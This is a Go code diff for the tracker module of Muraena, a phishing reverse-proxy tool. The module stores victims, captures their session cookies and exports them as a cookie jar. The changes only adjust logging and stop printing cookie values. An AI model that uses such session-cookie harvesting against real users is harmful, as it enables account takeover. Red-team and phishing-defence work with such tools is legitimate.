@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/evilsocket/islazy/tui"
+
 	"github.com/muraenateam/muraena/module/necrobrowser"
 
 	"github.com/muraenateam/muraena/core/db"
@@ -61,7 +62,7 @@ func (module *Tracker) ExportSession(id string) {
 
 	victim, err := db.GetVictim(id)
 	if err != nil {
-		module.Debug("error fetching victim %d: %s", id, err)
+		module.Error("error fetching victim (%s): %s", id, err)
 	}
 
 	// this extra loop and struct is needed since browsers expect the expiration time in unix time, so also different type
@@ -71,7 +72,7 @@ func (module *Tracker) ExportSession(id string) {
 		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
-			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
+			log.Warning("cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
 			continue
 		}
 
@@ -91,11 +92,11 @@ func (module *Tracker) ExportSession(id string) {
 
 	cookieJarJson, err := json.Marshal(cookieJar)
 	if err != nil {
-		module.Warning("Error marshalling the cookieJar: %s", err)
+		module.Error("error marshalling cookie jar: %s", err)
 		return
 	}
 
-	log.Info("Victim %s CookieJar:\n\n%s", id, cookieJarJson)
+	log.Info("CookieJar:\n%s", tui.Bold(string(cookieJarJson)))
 }
 
 // ShowVictims prints the list of victims
@@ -123,7 +124,7 @@ func (module *Tracker) ShowVictims() {
 // PushVictim stores a Victim in the database
 func (module *Tracker) PushVictim(v *db.Victim) {
 	if err := v.Store(); err != nil {
-		module.Debug("error adding victim to redis: %s", err)
+		module.Error("error storing victim: %s", err)
 	}
 }
 
@@ -140,6 +141,6 @@ func (module *Tracker) PushCookie(victim *db.Victim, cookie db.VictimCookie) {
 		return
 	}
 
-	module.Debug("[%s] New victim cookie: %s on %s with value %s",
-		victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Domain), tui.Bold(cookie.Value))
+	module.Debug("[%s] New cookie: %s on %s",
+		victim.ID, tui.Bold(cookie.Name), tui.Bold(cookie.Domain))
 }
